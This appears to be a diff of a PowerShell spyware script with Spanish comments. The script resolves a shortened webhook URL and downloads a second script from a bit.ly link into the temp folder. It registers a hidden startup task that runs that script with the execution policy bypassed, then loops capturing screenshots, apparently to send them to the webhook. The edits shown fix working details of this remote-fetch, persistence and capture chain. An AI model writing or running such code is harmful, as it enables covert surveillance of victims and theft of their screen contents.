@@ -4,7 +4,7 @@ $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
 if ($hookurl.Length -ne 121) {
-    Write-Host "Shortened Webhook URL Detectedooo..."
+    Write-Host "Shortened Webhook URL Detected1..."
     $hookurl = (irm $hookurl).url
 }
 
@@ -13,12 +13,12 @@ $tempFolderPath = [System.IO.Path]::GetTempPath()
 $scriptPath = Join-Path -Path $tempFolderPath -ChildPath "sysw.ps1"
 
 # Descargar el script en la carpeta temporal del usuario
-Invoke-WebRequest -Uri "http://bit.ly/screen_dc" -OutFile $scriptPath
+Invoke-WebRequest -Uri "https://bit.ly/Screen_dc" -OutFile $scriptPath
 
 # Crear la tarea programada en el Registro de tareas de usuario
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
 $trigger = New-ScheduledTaskTrigger -AtStartup
-Register-ScheduledTask -TaskName "ScriptStartupTask" -Action $action -Trigger $trigger -User $env:USERNAME -RunLevel LimitedAccess
+Register-ScheduledTask -TaskName "ScriptStartupTask" -Action $action -Trigger $trigger -User $env:USERNAME -RunLevel Limited
 
 do {
     $Filett = "$env:temp\SC.png"
